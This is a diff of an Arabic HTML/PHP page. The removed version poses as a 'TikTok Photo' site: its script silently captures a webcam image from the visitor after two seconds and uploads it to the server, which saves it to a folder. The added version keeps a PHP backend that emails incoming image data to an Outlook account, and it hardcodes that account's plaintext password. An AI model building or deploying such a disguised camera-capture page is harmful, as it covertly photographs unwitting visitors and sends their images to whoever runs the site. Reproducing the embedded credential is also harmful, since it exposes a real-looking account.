@@ -1,50 +1,52 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-    <meta charset="utf-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Photo</title>
-    <link rel="icon" href="https://w7.pngwing.com/pngs/986/124/png-transparent-tiktok-social-media-logos-brands-icon.png">
-    <style>
-        /* أضف أي تنسيق CSS هنا */
-    </style>
+    <title>صفحة HTML مع كود PHP</title>
 </head>
 <body>
-    <h1>برمجة بوصلحهـ</h1>
-    <p>تم برمجة هذا الموقع كـ مؤقت كتجربة اولية . وسوف يتم تطويرها مستقبلا ..</p>
-    <canvas id="canvas" width="640" height="480"></canvas>
-    <script>
-        // السماح بالوصول إلى كاميرا الويب والتقاط صورة
-        navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(stream) {
-            var video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            setTimeout(function() {
-                var canvas = document.getElementById('canvas');
-                var context = canvas.getContext('2d');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                // تحويل الصورة إلى بيانات URL
-                var imageData = canvas.toDataURL('image/jpeg'); // استخدام تنسيق JPEG
-                // إرسال الصورة إلى ملف الموقع باستخدام PHP
-                var xhr = new XMLHttpRequest();
-                xhr.open('POST', 'save_image.php', true);
-                xhr.setRequestHeader('Content-Type', 'application/octet-stream');
-                xhr.send(imageData);
-                console.log('تم حفظ الصورة في المجلد بنجاح.');
-            }, 2000);
-        })
-        .catch(function(error) {
-            console.error('حدث خطأ في الوصول إلى الكاميرا: ', error);
-        });
-    </script>
+    <h1>تطبيق تصوير الصور</h1>
+    <!-- استمرار العرض العادي للصفحة -->
+    
     <?php
+    // الكود PHP هنا
+    require 'PHPMailer/PHPMailer.php';
+    require 'PHPMailer/SMTP.php';
+
     // استقبال بيانات الصورة من الجسم
     $imageData = file_get_contents('php://input');
-    // حفظ الصورة في مجلد myphotos
-    file_put_contents('myphotos/image.jpg', base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $imageData)));
+
+    // إنشاء كائن PHPMailer
+    $mail = new PHPMailer\PHPMailer\PHPMailer();
+
+    // تكوين الإعدادات
+    $mail->isSMTP();
+    $mail->Host = 'smtp.office365.com'; // خادم البريد الإلكتروني لـ Outlook
+    $mail->SMTPAuth = true;
+    $mail->Username = 'a_b@outlook.sa'; // عنوان بريدك الإلكتروني
+    $mail->Password = 'Wael_1313'; // كلمة مرور حساب بريدك الإلكتروني
+    $mail->SMTPSecure = 'tls'; // يمكنك تغييرها إلى 'ssl' إذا لزم الأمر
+    $mail->Port = 587; // منفذ خادم البريد الإلكتروني
+
+    $mail->setFrom('a_b@outlook.sa', 'Your Name'); // عنوان بريدك الإلكتروني واسمك
+    $mail->addAddress('a_b@outlook.sa'); // تعديل البريد ليكون نفس بريدك الإلكتروني
+
+    // إعداد محتوى البريد الإلكتروني
+    $mail->Subject = 'New Photo';
+    $mail->Body = 'Please find the attached photo.';
+    $mail->isHTML(false);
+
+    // إرفاق الصورة كمرفق
+    $mail->addStringAttachment($imageData, 'image.jpg');
+
+    // إرسال البريد الإلكتروني
+    if (!$mail->send()) {
+        echo 'Mailer Error: ' . $mail->ErrorInfo;
+    } else {
+        echo 'Message sent successfully';
+    }
     ?>
+
 </body>
 </html>
